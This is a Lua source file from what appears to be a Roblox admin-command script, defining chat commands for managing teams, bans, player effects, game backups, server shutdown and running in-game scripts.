RunModule("CommandModule","newteam","Creates a new team","newt","#cs#(.+)",function(Speaker,Input)
	local Teams=game:GetService("Teams");
	local Team=NewInstance("Team");
	local TeamName,R,G,B=Input:match(RunModule("ParseMatch","(.-)#cs#(%d+),(%d+),(%d+)"));
	if (R~=nil) and (G~=nil) and (B~=nil) then
		Team.TeamColor=NewBrickColor(R/255,G/255,B/255);
		Team.Name=TeamName;
		Team.AutoColorCharacters=false;
		Team.Parent=Teams;
	else
		Team.TeamColor=RandomBrickColor();
		Team.Name=Input;
		Team.AutoColorCharacters=false;
		Team.Parent=Teams;
	end
end,true)
RunModule("CommandModule","switchteam","Switches the given user to a different team","swt","#cs#(.-)#cs#(.+)",function(Speaker,Usernames,TeamName)
	local Targets=RunModule("GetPlayer",Usernames,Speaker);
	local Teams=game:GetService("Teams");
	local SelectedTeam;
	for TeamIndex,Team in pairs(Teams:GetTeams()) do
		if (Team.Name:lower():find(TeamName)==1) then
			SelectedTeam=Team;
		end
	end
	if (SelectedTeam==nil) then return end
	if (Targets~=nil) then
		for Index,Target in pairs(Targets) do
			Target.TeamColor=SelectedTeam.TeamColor;
			Target.Neutral=false;
		end
	end
end)
RunModule("CommandModule","removeteam","Removes the given team","remt","#cs#(.+)",function(Speaker,TeamName)
	local Teams=game:GetService("Teams");
	for Index,Team in pairs(Teams:GetTeams()) do
		if (Team.Name:lower():find(TeamName:lower())==1) then
			Team:Remove();
		end
	end
	if (#Teams:GetTeams()==0) then
		for Index,Player in pairs(game:GetService("Players"):GetPlayers()) do
			Player.Neutral=true;
		end
	end
end)
RunModule("CommandModule","neutralon","Makes the given user neutral (Player.Neutral)","neuon","#cs#(.+)",function(Speaker,...)
	local Targets=RunModule("GetPlayer",...,Speaker);
	if (Targets~=nil) then
		for Index,Target in pairs(Targets) do
		Target.Neutral=true;
		end
	end
end)
RunModule("CommandModule","neutraloff","Makes the given user not neutral (Player.Neutral)","neuoff","#cs#(.+)",function(Speaker,...)
	local Targets=RunModule("GetPlayer",...,Speaker);
	if (Targets~=nil) then
		for Index,Target in pairs(Targets) do
		Target.Neutral=false;
		end
	end
end)
RunModule("CommandModule","adminlist","Shows the admin list","cal","#cs#",function(Speaker)
	local Index=0;
	local DisplayText=string.rep(" ",40).."Adminlist: "..table.concat(MaskAdminlist,", ");
	local Hint=RunModule("ShowHint",Speaker,DisplayText);
	while RunModule("ScrollText",DisplayText,Index)~="" do
		Hint.Text=RunModule("ScrollText",DisplayText,Index);
		Index=Index+1;
		wait(0.05);
	end
	Hint.Parent=nil;
end)
RunModule("CommandModule","bannedlist","Shows the banned list","cbl","#cs#",function(Speaker)
	local Index=0;
	local DisplayText=string.rep(" ",40).."Bannedlist: "..table.concat(Bannedlist,", ");
	local Hint=RunModule("ShowHint",Speaker,DisplayText);
	while RunModule("ScrollText",DisplayText,Index)~="" do
		Hint.Text=RunModule("ScrollText",DisplayText,Index);
		Index=Index+1;
		wait(0.05);
	end
	Hint.Parent=nil;
end)
RunModule("CommandModule","hint","Creates a hint","hn","#cs#(.+)",function(Speaker,Text)
	local Hint=NewInstance("Hint")
	Hint.Parent=Workspace;
	Hint.Text=Text;
	delay(5,function() Hint:Remove() end)
end,true)
RunModule("CommandModule","message","Creates a message","ms","#cs#(.+)",function(Speaker,Text)
	local Hint=NewInstance("Message")
	Hint.Parent=Workspace;
	Hint.Text=Text;
	delay(5,function() Hint:Remove() end)
end,true)
RunModule("CommandModule",RunModule("ParseMatch","ban#cs#t"),"Bans the given user","bn","#cs#(.+)",function(Speaker,...)
	local Targets=RunModule("GetPlayer",...,Speaker);
	if (Targets~=nil) then
		for Index,Target in pairs(Targets) do
			if (RunModule("DisposePlayer",Target,Speaker)) then
				Bannedlist[#Bannedlist+1]=Target.Name;
			end
		end
	end
end)
RunModule("CommandModule",RunModule("ParseMatch","ban#cs#f"),"Unbans the given name","ub","#cs#(.+)",function(Speaker,Input)
	if (Input=="all") then
		Bannedlist={};
	end
	for Index,Username in pairs(Bannedlist) do
		if (Username:lower():find(Input)==1) then
			RunModule("ShowHint",Speaker,"Unbanning: "..Username,5);
			table.remove(Bannedlist,Index);
		end
	end
end)
RunModule("CommandModule","respawn","Respawns the given user","rs","#cs#(.+)",function(Speaker,...)
	local Targets=RunModule("GetPlayer",...,Speaker)
	if (Targets~=nil) then
		for Index,Target in pairs(Targets) do
			local Model=NewInstance("Model")
			local Torso=NewInstance("Part")
			local Humanoid=NewInstance("Humanoid")
			Torso.Name="Torso";
			Torso.CanCollide=false;
			Torso.Anchored=false;
			Torso.Transparency=1;
			Torso.Parent=Model;
			Humanoid.Parent=Model;
			Model.Name=Target.Name;
			Model.Parent=Workspace;
			Target.Character=Model;
		end
	end
end)
RunModule("CommandModule","resetappearance","Resets the CharacterAppearance of the given user","ra","#cs#(.+)",function(Speaker,...)
	local Targets=RunModule("GetPlayer",...,Speaker);
	if (Targets~=nil) then
		for Index,Target in pairs(Targets) do
			pcall(function() Target.CharacterAppearance="http://www.roblox.com/Asset/CharacterFetch.ashx?UserID="..Target.userId.."&PlaceId="..game.PlaceId; end)
			pcall(function() Target.Character:BreakJoints(); end)
		end
	end
end)
RunModule("CommandModule","changeappearance","Sets the CharacterAppearance of the given user","ca","#cs#(.-)#cs#(%d+)",function(Speaker,Input,Integer)
	if (tonumber(Integer)==nil) or (Input==nil) then return end
	local Targets=RunModule("GetPlayer",Input,Speaker)
	if (Targets~=nil) then
		for Index,Target in pairs(Targets) do
			pcall(function() Target.CharacterAppearance="http://www.roblox.com/Asset/CharacterFetch.ashx?UserID="..Integer.."&PlaceId="..game.PlaceId; end)
			pcall(function() Target.Character:BreakJoints(); end)
		end
	end
end)
RunModule("CommandModule","sparkleson","Makes the given user look sparkley","spon","#cs#(.+)",function(Speaker,...)
	local Targets=RunModule("GetPlayer",...,Speaker);
	if (Targets~=nil) then
		for Index,Target in pairs(Targets) do
			if (Target.Character~=nil) then
				for ChildIndex,Child in pairs(Target.Character:GetChildren()) do
					if (Child.ClassName=="Part") then
						local Sparkles=NewInstance("Sparkles")
						Sparkles.SparkleColor=NewColor3(0,0,1);
						Sparkles.Parent=Child;
					end
				end
			end
		end
	end
end)
RunModule("CommandModule","sparklesoff","Removes the sparkles from the given user","spoff","#cs#(.+)",function(Speaker,...)
	local Targets=RunModule("GetPlayer",...,Speaker);
	if (Targets~=nil) then
		for Index,Target in pairs(Targets) do
			if (Target.Character~=nil) then
				for ChildIndex,Child in pairs(Target.Character:GetChildren()) do
					if (Child.ClassName=="Part") then
						for InnerIndex,InnerChild in pairs(Child:GetChildren()) do
							if (InnerChild.ClassName=="Sparkles") then
								InnerChild:Remove()
							end
						end
					end
				end
			end
		end
	end
end)
RunModule("CommandModule","scrollingmessage","Creates a scrolling message","sm","#cs#(.+)",function(Speaker,String)
	local Message=NewInstance("Message");
	Message.Parent=Workspace;
	local Effect=NewInstance("Sound");
	Effect.SoundId="rbxasset://sounds\\switch.wav";
	Effect.Parent=Workspace;
	for Index=1,#String do
	Effect:Play();
	Message.Text=Message.Text..String:sub(Index,Index);
	wait(0.09);
	end
	wait(0.5);
	Message.Parent=nil;
	Effect.Parent=nil;
end,true)
RunModule("CommandModule","speed","Changes the WalkSpeed of the given user","ws","#cs#(.-)#cs#(%d+)",function(Speaker,Input,Integer)
	local Targets=RunModule("GetPlayer",Input,Speaker);
	if (Targets~=nil) and (Integer~=nil) then
		for Index,Target in pairs(Targets) do
			if (Target.Character~=nil) then
				for ChildIndex,Child in pairs(Target.Character:GetChildren()) do
					if (Child.ClassName=="Humanoid") then
						Child.WalkSpeed=Integer;
					end
				end
			end
		end
	end
end)
RunModule("CommandModule","shutdown","Shuts the server down","sd","#cs#",function(Speaker)
	if (not RunModule("IsAdmin",Speaker)) then return end
	RunModule("Shutdown");
end)
RunModule("CommandModule",RunModule("ParseMatch","admin#cs#t"),"Makes the given user a temporary admin","ad","#cs#(.+)",function(Speaker,...)
	if (not RunModule("IsAdmin",Speaker)) then return end
	local Targets=RunModule("GetPlayer",...,Speaker);
	if (Targets~=nil) then
		for Index,Target in pairs(Targets) do
				table.foreach(AdminConnectionList,function(Index,Connection) if (AdminUserList[Index]:lower()==Target.Name:lower()) then Connection:disconnect(); end end);
				AdminConnectionList[#AdminConnectionList+1]=Target.Chatted:connect(function(Message) RunModule("PlayerChat",Message,Player); end)
				AdminUserList[#AdminUserList+1]=Target.Name;
		end
	end
end)
RunModule("CommandModule",RunModule("ParseMatch","admin#cs#f"),"Removes the given user's temporary admin","ua","#cs#(.+)",function(Speaker,...)
	if (not RunModule("IsAdmin",Speaker)) then return end
	local Targets=RunModule("GetPlayer",...,Speaker);
	if (Targets~=nil) then
		for Index,Target in pairs(Targets) do
			table.foreach(AdminConnectionList,function(Index,Connection) if (AdminUserList[Index]:lower()==Target.Name:lower()) then Connection:disconnect(); end end)
		end
	end
end)
RunModule("CommandModule","script","Runs a script","sc","#cs#(.+)",function(Speaker,...) RunModule("CreateScript",...,Workspace); end,true);
RunModule("CommandModule","tool","Inserts the given tool","gt","#cs#(.-)#cs#(.+)",function(Speaker,Input,ToolName)
	local InsertService=game:GetService("InsertService") -- My least favorite service
	local Collection=InsertService:GetCollection(-92629280);
	local Tool=nil;
	local PreparedTool=nil;
	for Index,Model in pairs(Collection) do
		if (Model.Name:lower()=="tool."..tostring(ToolName):lower()) then
			Tool=InsertService:LoadAssetVersion(Model.AssetVersionId);
			break
		end
	end
	if (Tool~=nil) then
		PreparedTool=Tool:GetChildren()[1];
	end
	local Targets=RunModule("GetPlayer",Input,Speaker);
	if (Targets~=nil) then
		for Index,Target in pairs(Targets) do
			PreparedTool:Clone().Parent=Target:FindFirstChild("Backpack");
		end
	end
end)
RunModule("CommandModule",RunModule("ParseMatch","ban#cs#d"),"Bans the given user using data persistence for the given amount of hours.","dpb","#cs#(.-)#cs#(%d+)",function(Speaker,Input,Length)
	if (Input==nil) or (Length==nil) then return end
	local Targets=RunModule("GetPlayer",Input,Speaker);
	if (Targets~=nil) then
		for Index,Target in pairs(Targets) do
			if (RunModule("DisposePlayer",Target,Speaker,true)==true) then
				pcall(Target.SaveString,Target,DataKey,RunModule("ConvertTable",{Type=0,UnbanAt=math.floor(tick()+(tonumber(Length)*3600))}));
				RunModule("DisposePlayer",Target,Speaker);
			end
		end
	end
end)
RunModule("CommandModule","restoregame","Restores the game to it's state when the backup was created","rg","#cs#(.+)",function(Speaker,Input)
	if (Input==nil) then return end
	if (GameBackups[Input]==nil) then
		RunModule("ShowHint",Speaker,"That backup key doesn't exist.",5);
		return
	end
	RunModule("RestoreGame",Input);
end)
RunModule("CommandModule","backupgame","Backs up the game so you casn restore it later","bg","#cs#(.+)",function(Speaker,Input)
	if (Input==nil) then return end
	if (GameBackups[Input]~=nil) then
		RunModule("ShowHint",Speaker,"That backup key already exists.",5);
		return
	end
	RunModule("BackupGame",Input);
	RunModule("ShowHint",Speaker,"Backup created",5);
end)
RunModule("CommandModule","teleport","Teleports two or more users together","tp","#cs#(.-)#cs#(.+)",function(Speaker,Input1,Input2)
	if (Input1==nil) or (Input2==nil) then return end
	local Targets1,Targets2=RunModule("GetPlayer",Input1,Speaker),RunModule("GetPlayer",Input2,Speaker);
	if (Targets1==nil) or (Targets2==nil) then return end
	if (#Targets2~=1) then return end
	for Index,Target in pairs(Targets1) do
		if (Target.Character~=nil) and (Targets2[1].Character~=nil) then
			local Torso=Target.Character:FindFirstChild("Torso");
			local Torso2=Targets2[1].Character:FindFirstChild("Torso");
			if (Torso~=nil) and (Torso2~=nil) then
				Torso.CFrame=Torso2.CFrame;
			end
		end
	end
end)
RunModule("CommandModule","pri","Toggles the private server settings","ps","#cs#(%w+)",function(Speaker,Input)
	if (Input=="true") or (Input=="yes") or (Input=="1") or (Input=="on") then
		SetSystemSetting("PrivateServer",true);
	elseif (Input=="false") or (Input=="no") or (Input=="0") or (Input=="off") then
		SetSystemSetting("PrivateServer",false);
	end
end)
RunModule("CommandModule","scriptl","Creates a pseudo-LocalScript targeted at the speaker, with the given source.","scl","#cs#(.+)",function(Speaker,Input)
	if (Input==nil) then return end
	RunModule("CreateScript",[[local LocalBin=Instance.new("HopperBin");
LocalBin.Parent=game:GetService("Players")["]]..Speaker.Name..[["].Backpack;
LocalBin.Name="LocalBin";
if (game:GetService("Players").LocalPlayer==nil) then return end
]]..Input,Workspace);
end,true)
RunModule("CommandModule","clear","Clears the game of all objects, excluding this script and players","cln","#cs#",function(Speaker)
	local Children=Workspace:GetChildren();
	for ChildIndex,Child in pairs(Children) do
		if (Child~=script) then
			pcall(function() Child:Remove(); end);
		end
	end
end)
RunModule("CommandModule",RunModule("ParseMatch","ban#cs#p"),"Uses data persistence to ban the given user for the given amount of hours.","db","#cs#(.-)#cs#(%d+)",function(Speaker,Input,Length)
	if (Input==nil) or (Length==nil) then return end
	local Targets=RunModule("GetPlayer",Input,Speaker);
	if (Targets==nil) then return end
	for Index,Target in pairs(Targets) do
		if (RunModule("DisposePlayer",Target,Speaker,true)==true) then
			pcall(function() Target:SaveString(DataKey,Target:LoadString(DataKey)..RunModule("ConvertTable",{Type=0,Value=math.floor(tick()+(tonumber(Length)*3600))})) end)
			RunModule("DisposePlayer",Target,Speaker);
		end
	end
end)
RunModule("CommandModule","newbase","Creates a new baseplate","nb","#cs#",function(Speaker)
	local Base=NewInstance("Part");
	Base.Size=NewVector3(512,1,512);
	Base.Name="Base";
	Base.CFrame=NewCFrame(0,0,0);
	Base.Anchored=true;
	Base.Locked=true;
	Base.BrickColor=NewBrickColor("Earth green");
	Base.Parent=Workspace;
end)
RunModule("CommandModule","fireon","Gives the given user fire","fion","#cs#(.+)",function(Speaker,...)
	local Targets=RunModule("GetPlayer",...,Speaker);
	if (Targets~=nil) then
		for Index,Target in pairs(Targets) do
			if (Target.Character~=nil) then
				for ChildIndex,Child in pairs(Target.Character:GetChildren()) do
					if (Child.ClassName=="Part") then
						local Fire=NewInstance("Fire")
						Fire.SparkleColor=NewColor3(0,0,1);
						Fire.Parent=Child;
					end
				end
			end
		end
	end
end)
RunModule("CommandModule","fireoff","Removes the given user's fire","fioff","#cs#(.+)",function(Speaker,...)
	local Targets=RunModule("GetPlayer",...,Speaker);
	if (Targets~=nil) then
		for Index,Target in pairs(Targets) do
			if (Target.Character~=nil) then
				for ChildIndex,Child in pairs(Target.Character:GetChildren()) do
					if (Child.ClassName=="Part") then
						for InnerIndex,InnerChild in pairs(Child:GetChildren()) do
							if (InnerChild.ClassName=="Fire") then
								InnerChild:Remove()
							end
						end
					end
				end
			end
		end
	end
end)
RunModule("CommandModule","explode","Explodes the given user","exp","#cs#(.+)",function(Speaker,Input)
	local Targets=RunModule("GetPlayer",Input,Speaker);
	if (Targets~=nil) then
		for Index,Target in pairs(Targets) do
			if (Target.Character~=nil) then
				local Part=Target.Character:FindFirstChild("Torso");
				if (Part~=nil) then
					local Explosion=NewInstance("Explosion");
					Explosion.Position=Part.Position;
					Explosion.BlastPressure=50000;
					Explosion.BlastRadius=5;
					Explosion.Parent=Workspace;
				end
			end
		end
	end
end)
RunModule("CommandModule","badgeservice","Provides an interface to BadgeService.","bas","#cs#(.-)#cs#(%d+)#cs#(.+)",function(Speaker,Function,AssetId,Input)
	if (Input==nil) or (AssetId==nil) or (Function==nil) then return end
	local FunctionMap={["ab"]="AwardBadge",["awardbadge"]="AwardBadge",["ub"]="UserHasBadge",["userhasbadge"]="UserHasBadge",["hb"]="UserHasBadge",["uhb"]="UserHasBadge"};
	Function=FunctionMap[Function];
	if (Function==nil) then return end
	local Targets=RunModule("GetPlayer",Input,Speaker);
	if (Targets==nil) then return end
	for Index,Target in pairs(Targets) do
		if (Function=="AwardBadge") then
			game:GetService("BadgeService"):AwardBadge(Target.userId,AssetId);
		elseif (Function=="UserHasBadge") then
			local Result=game:GetService("BadgeService"):UserHasBadge(Target.userId,AssetId);
			RunModule("ShowHint",Speaker,"User "..Target.Name..(Result and " has badge ") or (not Result and " does not have badge ")..AssetId,3);
		end
	end
end)
RunModule("CommandModule","invincibleon","Makes the user invincible","ion","#cs#(.+)",function(Speaker,Input)
	local Targets=RunModule("GetPlayer",Input,Speaker)
	if (Targets~=nil) then
		for Index,Target in pairs(Targets) do
			if (Target.Character~=nil) then
				NewInstance("ForceField",Target.Character);
				for Index,Child in pairs(Target.Character:GetChildren()) do
					if (Child:IsA("Humanoid")) then
						Child.MaxHealth=math.huge;
						Child.Health=math.huge;
						Child.WalkSpeed=35;
					elseif (Child:IsA("BasePart")) then
						Child.Transparency=1;
						Instance.new("Sparkles",Child);
					elseif (Child:IsA("Hat")) then
						pcall(function() Child.Handle.Transparency=1; end);
					end
				end
			end
		end
	end
end)
RunModule("CommandModule","invincibleoff","Makes the user mortal","ioff","#cs#(.+)",function(Speaker,Input)
	local Targets=RunModule("GetPlayer",Input,Speaker)
	if (Targets~=nil) then
		for Index,Target in pairs(Targets) do
			if (Target.Character~=nil) then
				for Index,Child in pairs(Target.Character:GetChildren()) do
					if (Child:IsA("ForceField")) then
						Child:Remove();
					elseif (Child:IsA("Humanoid")) then
						Child.Health=100;
						Child.MaxHealth=100;
						Child.WalkSpeed=16;
					elseif (Child:IsA("BasePart")) then
						Child.Transparency=0;
						for SparkleIndex,SparkleChild in pairs(Child:GetChildren()) do
							if (SparkleChild:IsA("Sparkles")) then
								SparkleChild:Remove();
							end
						end
					elseif (Child:IsA("Hat")) then
						pcall(function() Child.Handle.Transparency=0; end);
					end
				end
			end
		end
	end
end)
game:GetService("Players").PlayerAdded:connect(function(...) RunModule("AddPlayer",...); end)
game:GetService("Players").PlayerRemoving:connect(function(...) RunModule("RemovePlayer",...); end)
table.foreach(game:GetService("Players"):GetPlayers(),function(Index,Player) RunModule("AddPlayer",Player); end)
pcall(function() RunModule("BackupGame","i") end) -- Updates keep breaking stuff...